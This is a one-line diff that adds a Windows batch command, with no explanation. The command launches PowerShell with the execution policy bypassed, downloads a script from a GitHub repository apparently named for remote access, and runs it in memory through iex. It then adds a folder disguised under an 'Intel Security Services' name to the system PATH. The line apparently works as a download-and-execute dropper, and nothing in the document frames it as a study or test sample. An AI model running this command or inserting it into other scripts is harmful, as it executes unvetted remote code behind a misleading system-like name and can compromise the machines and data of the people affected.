@@ -1,0 +1,1 @@
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/ridley-nelson17/liOS-Remote'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\'Intel Security Services'\bin\dump\temp"
